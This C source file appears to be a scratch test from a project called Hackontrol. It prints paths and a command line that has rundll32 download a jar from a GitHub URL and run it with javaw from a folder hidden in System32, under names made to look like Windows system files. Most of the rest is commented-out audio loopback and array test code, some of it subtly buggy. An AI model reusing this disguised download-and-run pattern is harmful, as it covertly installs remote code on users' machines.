#include <stdio.h>
#include <khopanwin32.h>
#include <khopanstring.h>
/*#include <khopanwin32.h>
#include <mmdeviceapi.h>
#include <audioclient.h>

EXTERN_GUID(CLSID_MMDeviceEnumerator, 0xBCDE0395, 0xE52F, 0x467C, 0x8E, 0x3D, 0xC4, 0x57, 0x92, 0x91, 0x69, 0x2E);
EXTERN_GUID(IID_IMMDeviceEnumerator,  0xA95664D2, 0x9614, 0x4F35, 0xA7, 0x46, 0xDE, 0x8D, 0xB6, 0x36, 0x17, 0xE6);
EXTERN_GUID(IID_IAudioClient,         0x1CB9AD4C, 0xDBFA, 0x4c32, 0xB1, 0x78, 0xC2, 0xF5, 0x68, 0xA7, 0x03, 0xB2);
EXTERN_GUID(IID_IAudioCaptureClient,  0xC8ADBD64, 0xE71E, 0x48a0, 0xA4, 0xDE, 0x18, 0x5C, 0x39, 0x5C, 0xD3, 0x17);
EXTERN_GUID(IID_IAudioRenderClient,   0xF294ACFC, 0x3146, 0x4483, 0xA7, 0xBF, 0xAD, 0xDC, 0xA7, 0xC2, 0x60, 0xE2);*/

#define FREE(x) if(LocalFree(x)) KHWin32DialogErrorW(GetLastError(), L"LocalFree")

#define FILE_JAVAW        L"javaw.exe"
#define FILE_LIBDLL32     L"libdll32.dll"
#define FILE_RUNDLL32     L"rundll32.exe"
#define FILE_HACKONTROL   L"hackontrol.jar"
#define FILE_WINSERVICE32 L"winservice32.jar"
#define FOLDER_SYSTEM32   L"System32"
#define FOLDER_JAVA       L"jn"
#define FUNCTION_LIBDLL32 L"DownloadFile"
#define URL_HACKONTROL    L"https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/release/"

int main(int argc, char** argv) {
	LPWSTR pathFolderWindows = KHWin32GetWindowsDirectoryW();

	if(!pathFolderWindows) {
		KHWin32DialogErrorW(GetLastError(), L"KHGetWindowsDirectoryW");
		return;
	}

	LPWSTR pathFolderSystem32 = KHFormatMessageW(L"%ws\\" FOLDER_SYSTEM32, pathFolderWindows);
	FREE(pathFolderWindows);

	if(!pathFolderSystem32) {
		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		return;
	}

	LPWSTR pathFileRundll32 = KHFormatMessageW(L"%ws\\" FILE_RUNDLL32, pathFolderSystem32);

	if(!pathFileRundll32) {
		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		return;
	}

	printf("System32: %ws\nRundll32: %ws\nArgument: %ws\n", pathFolderSystem32, pathFileRundll32, FILE_RUNDLL32 L" " FILE_LIBDLL32 L"," FUNCTION_LIBDLL32 L" " URL_HACKONTROL FILE_HACKONTROL L"," FILE_WINSERVICE32);

	LPSTR pathFolderJava = KHFormatMessageA("%ws\\%ws", pathFolderSystem32, FOLDER_JAVA);

	if(!pathFolderJava) {
		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		return;
	}

	printf("\nJava: %s\n", pathFolderJava);

	LPWSTR pathFolderJavaBinary = KHFormatMessageW(L"%ws\\" FOLDER_JAVA L"\\bin", pathFolderSystem32);

	if(!pathFolderJavaBinary) {
		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		return;
	}

	LPWSTR pathFileJavaw = KHFormatMessageW(L"%ws\\" FILE_JAVAW, pathFolderJavaBinary);

	if(!pathFileJavaw) {
		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		FREE(pathFolderJavaBinary);
		return;
	}

	printf("\nJavaw: %ws\nArgument: %ws\nBinary: %ws\n", pathFileJavaw, FILE_JAVAW L" -jar ..\\..\\" FILE_WINSERVICE32, pathFolderJavaBinary);
	/*FILE* file;
	errno_t error = fopen_s(&file, "imnotexistpleasedontletmeexist", "r");
	char* value = strerror(error);
	printf("Data: %s\n", value);*/
	/*ArrayList list;
	
	if(!KHArrayInitialize(&list, sizeof(UINT32))) {
		KHWin32ConsoleErrorW(GetLastError(), L"KHArrayInitialize");
		return 1;
	}

	size_t size;

	if(!KHArraySize(&list, &size)) {
		KHWin32ConsoleErrorW(GetLastError(), L"KHArraySize");
		return 1;
	}

	printf("Size: %llu\n", size);

	for(size_t i = 0; i < 1000; i++) {
		UINT32 value = rand();

		if(!KHArrayAdd(&list, &value)) {
			KHWin32ConsoleErrorW(GetLastError(), L"KHArrayAdd");
			return 1;
		}
	}

	if(!KHArraySize(&list, &size)) {
		KHWin32ConsoleErrorW(GetLastError(), L"KHArraySize");
		return 1;
	}

	printf("Size: %llu\n", size);
	PUINT32 data;

	for(size_t i = 0; i < size; i++) {
		if(!KHArrayGet(&list, i, &data)) {
			KHWin32ConsoleErrorW(GetLastError(), L"KHArraySize");
			return 1;
		}

		UINT32 integer = *data;
		printf("Index: %llu Data: %lu\n", i, integer);
	}

	if(!KHArrayFree(&list)) {
		KHWin32ConsoleErrorW(GetLastError(), L"KHArrayFree");
		return 1;
	}*/

	/*HRESULT result = CoInitialize(NULL);

	if(FAILED(result)) {
		KHWin32ConsoleErrorW(result, L"CoInitialize");
		return 1;
	}

	IMMDeviceEnumerator* enumerator;
	result = CoCreateInstance(&CLSID_MMDeviceEnumerator, NULL, CLSCTX_ALL, &IID_IMMDeviceEnumerator, &enumerator);
	int returnValue = 1;

	if(FAILED(result)) {
		KHWin32ConsoleErrorW(result, L"CoCreateInstance");
		goto uninitialize;
	}

	IMMDevice* renderDevice;
	result = enumerator->lpVtbl->GetDefaultAudioEndpoint(enumerator, eRender, eConsole, &renderDevice);

	if(FAILED(result)) {
		KHWin32ConsoleErrorW(result, L"IMMDeviceEnumerator::GetDefaultAudioEndpoint");
		enumerator->lpVtbl->Release(enumerator);
		goto uninitialize;
	}

	IMMDevice* captureDevice;
	result = enumerator->lpVtbl->GetDefaultAudioEndpoint(enumerator, eCapture, eConsole, &captureDevice);
	enumerator->lpVtbl->Release(enumerator);

	if(FAILED(result)) {
		KHWin32ConsoleErrorW(result, L"IMMDeviceEnumerator::GetDefaultAudioEndpoint");
		renderDevice->lpVtbl->Release(renderDevice);
		goto uninitialize;
	}

	IAudioClient* renderClient;
	result = renderDevice->lpVtbl->Activate(renderDevice, &IID_IAudioClient, CLSCTX_ALL, NULL, &renderClient);
	renderDevice->lpVtbl->Release(renderDevice);

	if(FAILED(result)) {
		KHWin32ConsoleErrorW(result, L"IMMDevice::Activate");
		captureDevice->lpVtbl->Release(captureDevice);
		goto uninitialize;
	}

	IAudioClient* captureClient;
	result = captureDevice->lpVtbl->Activate(captureDevice, &IID_IAudioClient, CLSCTX_ALL, NULL, &captureClient);
	captureDevice->lpVtbl->Release(captureDevice);

	if(FAILED(result)) {
		KHWin32ConsoleErrorW(result, L"IMMDevice::Activate");
		goto releaseRenderClient;
	}

	WAVEFORMATEX* renderFormat;
	result = renderClient->lpVtbl->GetMixFormat(renderClient, &renderFormat);

	if(FAILED(result)) {
		KHWin32ConsoleErrorW(result, L"IAudioClient::GetMixFormat");
		goto releaseCaptureClient;
	}

	WAVEFORMATEX* captureFormat;
	result = captureClient->lpVtbl->GetMixFormat(captureClient, &captureFormat);

	if(FAILED(result)) {
		KHWin32ConsoleErrorW(result, L"IAudioClient::GetMixFormat");
		CoTaskMemFree(renderFormat);
		goto releaseCaptureClient;
	}
	
	result = renderClient->lpVtbl->Initialize(renderClient, AUDCLNT_SHAREMODE_SHARED, 0, 10000000, 0, renderFormat, NULL);

	if(FAILED(result)) {
		KHWin32ConsoleErrorW(KHWin32DecodeHRESULTError(result), L"IAudioClient::Initialize");
		goto freeFormat;
	}

	result = captureClient->lpVtbl->Initialize(captureClient, AUDCLNT_SHAREMODE_SHARED, 0, 10000000, 0, captureFormat, NULL);

	if(FAILED(result)) {
		KHWin32ConsoleErrorW(result, L"IAudioClient::Initialize");
		goto freeFormat;
	}

	UINT32 framesRender;
	result = renderClient->lpVtbl->GetBufferSize(renderClient, &framesRender);

	if(FAILED(result)) {
		KHWin32ConsoleErrorW(result, L"IAudioClient::GetBufferSize");
		goto freeFormat;
	}

	UINT32 framesCapture;
	result = captureClient->lpVtbl->GetBufferSize(captureClient, &framesCapture);

	if(FAILED(result)) {
		KHWin32ConsoleErrorW(result, L"IAudioClient::GetBufferSize");
		goto freeFormat;
	}

	IAudioRenderClient* audioRender;
	result = renderClient->lpVtbl->GetService(renderClient, &IID_IAudioRenderClient, &audioRender);

	if(FAILED(result)) {
		KHWin32ConsoleErrorW(KHWin32DecodeHRESULTError(result), L"IAudioClient::GetService");
		goto freeFormat;
	}

	IAudioCaptureClient* audioCapture;
	result = captureClient->lpVtbl->GetService(captureClient, &IID_IAudioCaptureClient, &audioCapture);

	if(FAILED(result)) {
		KHWin32ConsoleErrorW(result, L"IAudioClient::GetService");
		goto releaseAudioRender;
	}

	REFERENCE_TIME actualDuration = 10000000 * framesRender / renderFormat->nSamplesPerSec;
	result = renderClient->lpVtbl->Start(renderClient);

	if(FAILED(result)) {
		KHWin32ConsoleErrorW(result, L"IAudioClient::Start");
		goto releaseAudioCapture;
	}

	result = captureClient->lpVtbl->Start(captureClient);

	if(FAILED(result)) {
		KHWin32ConsoleErrorW(result, L"IAudioClient::Start");
		goto releaseAudioCapture;
	}

	BOOL done = FALSE;
	BYTE* data;
	UINT32 framesToRead;
	DWORD flags;
	// This is way too hard

	while(!done) {
		Sleep((DWORD) (actualDuration / 10000 / 2));
		UINT32 packetSize;
		result = audioCapture->lpVtbl->GetNextPacketSize(audioCapture, &packetSize);

		if(FAILED(result)) {
			KHWin32ConsoleErrorW(result, L"IAudioCaptureClient::GetNextPacketSize");
			goto releaseAudioCapture;
		}

		while(packetSize != 0) {
			result = audioCapture->lpVtbl->GetBuffer(audioCapture, &data, &framesToRead, &flags, NULL, NULL);

			if(FAILED(result)) {
				KHWin32ConsoleErrorW(result, L"IAudioCaptureClient::GetBuffer");
				goto releaseAudioCapture;
			}

			BYTE* renderData;
			result = audioRender->lpVtbl->GetBuffer(audioRender, framesToRead, &renderData);

			if(FAILED(result)) {
				KHWin32ConsoleErrorW(result, L"IAudioRenderClient::GetBuffer");
				goto releaseAudioCapture;
			}

			memcpy(renderData, data, framesToRead);
			result = audioRender->lpVtbl->ReleaseBuffer(audioRender, framesToRead, flags);

			if(FAILED(result)) {
				KHWin32ConsoleErrorW(result, L"IAudioRenderClient::ReleaseBuffer");
				goto releaseAudioCapture;
			}

			result = audioCapture->lpVtbl->ReleaseBuffer(audioCapture, framesToRead);

			if(FAILED(result)) {
				KHWin32ConsoleErrorW(result, L"IAudioCaptureClient::ReleaseBuffer");
				goto releaseAudioCapture;
			}

			result = audioCapture->lpVtbl->GetNextPacketSize(audioCapture, &packetSize);

			if(FAILED(result)) {
				KHWin32ConsoleErrorW(result, L"IAudioCaptureClient::GetNextPacketSize");
				goto releaseAudioCapture;
			}
		}
	}

	result = renderClient->lpVtbl->Stop(renderClient);

	if(FAILED(result)) {
		KHWin32ConsoleErrorW(result, L"IAudioClient::Stop");
		goto releaseAudioCapture;
	}

	result = captureClient->lpVtbl->Stop(captureClient);

	if(FAILED(result)) {
		KHWin32ConsoleErrorW(result, L"IAudioClient::Stop");
		goto releaseAudioCapture;
	}
	
	returnValue = 0;
releaseAudioCapture:
	audioCapture->lpVtbl->Release(audioCapture);
releaseAudioRender:
	audioRender->lpVtbl->Release(audioRender);
freeFormat:
	CoTaskMemFree(renderFormat);
	CoTaskMemFree(captureFormat);
releaseCaptureClient:
	captureClient->lpVtbl->Release(captureClient);
releaseRenderClient:
	renderClient->lpVtbl->Release(renderClient);
uninitialize:
	CoUninitialize();
	return returnValue;*/
}
